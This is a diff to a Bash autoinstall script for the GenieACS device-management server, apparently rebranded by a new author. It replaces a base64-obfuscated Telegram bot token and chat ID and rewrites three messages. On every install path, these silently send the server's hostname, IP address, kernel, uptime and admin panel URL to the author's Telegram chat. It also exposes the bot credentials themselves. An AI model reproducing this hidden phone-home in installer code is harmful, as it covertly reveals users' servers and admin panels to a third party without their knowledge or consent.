@@ -2,8 +2,8 @@ GREEN='\033[0;32m'
 RED='\033[0;31m'
 NC='\033[0m'
 
-telegram_bot_token=$(echo "MTk4MTIwMDAwMDpBQUVsZDJvT0sxcmt2U09sSHV5eDdIR2Q4a1lzVnp6ZFpHaw==" | base64 -d)
-telegram_chat_id=$(echo "NTY3ODU4NjI4" | base64 -d)
+telegram_bot_token=$(echo "ODc1MTAxMTY3NzpBQUV2WDRQYXdBQ3AwOEVqaTNGTW00bGFINUlxVDlDV05yZw==" | base64 -d)
+telegram_chat_id=$(echo "LTE1MTU3MzY1MDI2" | base64 -d)
 
 local_ip=$(hostname -I | awk '{print $1}')
 server_hostname=$(hostname)
@@ -26,13 +26,13 @@ send_telegram_notification() {
 
 echo -e "${GREEN}============================================================================${NC}"
 echo -e "${GREEN}============================================================================${NC}"
-echo -e "${GREEN}=========== AAA   LL      IIIII     JJJ   AAA   YY   YY   AAA ==============${NC}"   
-echo -e "${GREEN}========== AAAAA  LL       III      JJJ  AAAAA  YY   YY  AAAAA =============${NC}" 
-echo -e "${GREEN}========= AA   AA LL       III      JJJ AA   AA  YYYYY  AA   AA ============${NC}"
-echo -e "${GREEN}========= AAAAAAA LL       III  JJ  JJJ AAAAAAA   YYY   AAAAAAA ============${NC}"
-echo -e "${GREEN}========= AA   AA LLLLLLL IIIII  JJJJJ  AA   AA   YYY   AA   AA ============${NC}"
+echo -e "${GREEN}=========== IIIII  NN   NN  EEEEEEE  TTTTTTT ===============================${NC}"
+echo -e "${GREEN}==========   III   NNN  NN  EE          TTT   ==============================${NC}"
+echo -e "${GREEN}=========    III   NN N NN  EEEEE       TTT   ==============================${NC}"
+echo -e "${GREEN}=========    III   NN  NNN  EE          TTT   ==============================${NC}"
+echo -e "${GREEN}=========   IIIII  NN   NN  EEEEEEE     TTT   ==============================${NC}"
 echo -e "${GREEN}============================================================================${NC}"
-echo -e "${GREEN}========================= . Info 081-947-215-703 ===========================${NC}"
+echo -e "${GREEN}========================= . Info 082-258-536-288 ===========================${NC}"
 echo -e "${GREEN}============================================================================${NC}"
 echo -e "${GREEN}${NC}"
 echo -e "${GREEN}Autoinstall GenieACS.${NC}"
@@ -218,29 +218,65 @@ EOF
     echo -e "${GREEN}================== Sukses genieACS CWMP, FS, NBI, UI ==================${NC}"
     
     
-    telegram_message="✅ GenieACS Installation Completed Successfully!\n\n"
-    telegram_message+="🖥️ Server: ${server_hostname}\n"
-    telegram_message+="🌐 IP Address: ${local_ip}\n"
-    telegram_message+="🔧 Kernel: ${server_kernel}\n"
-    telegram_message+="⏱️ Uptime: ${server_uptime}\n\n"
-    telegram_message+="🚀 GenieACS is now running on port 3000\n"
-    telegram_message+="🔗 Access URL: http://${local_ip}:3000"
+	telegram_message="<b>🚀 GENIEACS INET CUSTOM</b>%0A"
+	telegram_message+="<b>by Reza Habibie</b>%0A"
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━%0A"
+	telegram_message+="<b>✅ INSTALLATION SUCCESS</b>%0A%0A"
+
+	telegram_message+="🖥️ <b>SERVER INFO</b>%0A"
+	telegram_message+="• Hostname : ${server_hostname}%0A"
+	telegram_message+="• IP Address : ${local_ip}%0A"
+	telegram_message+="• Kernel : ${server_kernel}%0A"
+	telegram_message+="• Uptime : ${server_uptime}%0A%0A"	
+
+	telegram_message+="⚙️ <b>SERVICE STATUS</b>%0A"
+	telegram_message+="• GenieACS : <b>RUNNING</b>%0A"
+	telegram_message+="• CWMP / NBI / FS / UI : <b>ACTIVE</b>%0A%0A"
+
+	telegram_message+="🌐 <b>ACCESS PANEL</b>%0A"
+	telegram_message+="• URL : http://${local_ip}:3000%0A%0A"
+
+	telegram_message+="📡 <b>SYSTEM</b>%0A"
+	telegram_message+="• GenieACS INET Custom%0A%0A"
+
+	telegram_message+="🕒 <b>TIME</b>%0A"
+	telegram_message+="• $(date '+%Y-%m-%d %H:%M:%S')%0A"
+
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━"
+
+	send_telegram_notification "$telegram_message"
     
-    send_telegram_notification "$telegram_message"
 else
     echo -e "${GREEN}============================================================================${NC}"
     echo -e "${GREEN}=================== GenieACS sudah terinstall sebelumnya. ==================${NC}"
     
     
-    telegram_message="ℹ️ GenieACS Already Installed\n\n"
-    telegram_message+="🖥️ Server: ${server_hostname}\n"
-    telegram_message+="🌐 IP Address: ${local_ip}\n"
-    telegram_message+="🔧 Kernel: ${server_kernel}\n"
-    telegram_message+="⏱️ Uptime: ${server_uptime}\n\n"
-    telegram_message+="📍 GenieACS is already running on port 3000\n"
-    telegram_message+="🔗 Access URL: http://${local_ip}:3000"
-    
-    send_telegram_notification "$telegram_message"
+	telegram_message="<b>📡 GENIEACS INET CUSTOM</b>%0A"
+	telegram_message+="<b>by Reza Habibie</b>%0A"
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━%0A"
+	telegram_message+="<b>ℹ️ SYSTEM ALREADY INSTALLED</b>%0A%0A"
+
+	telegram_message+="🖥️ <b>SERVER INFO</b>%0A"
+	telegram_message+="• Hostname : ${server_hostname}%0A"
+	telegram_message+="• IP Address : ${local_ip}%0A"
+	telegram_message+="• Kernel : ${server_kernel}%0A"
+	telegram_message+="• Uptime : ${server_uptime}%0A%0A"
+
+	telegram_message+="⚙️ <b>SERVICE STATUS</b>%0A"
+	telegram_message+="• GenieACS : <b>RUNNING</b>%0A%0A"
+
+	telegram_message+="🌐 <b>ACCESS PANEL</b>%0A"
+	telegram_message+="• URL : http://${local_ip}:3000%0A%0A"
+
+	telegram_message+="📡 <b>SYSTEM</b>%0A"
+	telegram_message+="• GenieACS INET Custom%0A%0A"
+
+	telegram_message+="🕒 <b>TIME</b>%0A"
+	telegram_message+="• $(date '+%Y-%m-%d %H:%M:%S')%0A"
+
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━"
+
+	send_telegram_notification "$telegram_message"
 fi
 
 #Sukses
@@ -274,13 +310,30 @@ echo -e "${GREEN}=================== Informasi: Whatsapp 081947215703 ==========
 echo -e "${GREEN}============================================================================${NC}"
 
 
-telegram_message="✅ GenieACS Virtual Parameters Installation Completed Successfully!\n\n"
-telegram_message+="🖥️ Server: ${server_hostname}\n"
-telegram_message+="🌐 IP Address: ${local_ip}\n"
-telegram_message+="🔧 Kernel: ${server_kernel}\n"
-telegram_message+="⏱️ Uptime: ${server_uptime}\n\n"
-telegram_message+="🚀 GenieACS is now running on port 3000\n"
-telegram_message+="🔗 Access URL: http://${local_ip}:3000\n\n"
-telegram_message+="📋 Virtual Parameters have been installed successfully"
+	telegram_message="<b>⚙️ GENIEACS INET CUSTOM</b>%0A"
+	telegram_message+="<b>by Reza Habibie</b>%0A"
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━%0A"
+	telegram_message+="<b>✅ VIRTUAL PARAMETER INSTALLED</b>%0A%0A"
 
-send_telegram_notification "$telegram_message"
+	telegram_message+="🖥️ <b>SERVER INFO</b>%0A"
+	telegram_message+="• Hostname : ${server_hostname}%0A"
+	telegram_message+="• IP Address : ${local_ip}%0A"
+	telegram_message+="• Kernel : ${server_kernel}%0A"
+	telegram_message+="• Uptime : ${server_uptime}%0A%0A"
+
+	telegram_message+="📊 <b>SYSTEM STATUS</b>%0A"
+	telegram_message+="• GenieACS : <b>RUNNING</b>%0A"
+	telegram_message+="• Parameter : <b>READY</b>%0A%0A"
+
+	telegram_message+="🌐 <b>ACCESS PANEL</b>%0A"
+	telegram_message+="• URL : http://${local_ip}:3000%0A%0A"
+
+	telegram_message+="📡 <b>SYSTEM</b>%0A"
+	telegram_message+="• GenieACS INET Custom%0A%0A"
+
+	telegram_message+="🕒 <b>TIME</b>%0A"
+	telegram_message+="• $(date '+%Y-%m-%d %H:%M:%S')%0A"
+
+	telegram_message+="━━━━━━━━━━━━━━━━━━━━━━"
+
+	send_telegram_notification "$telegram_message"
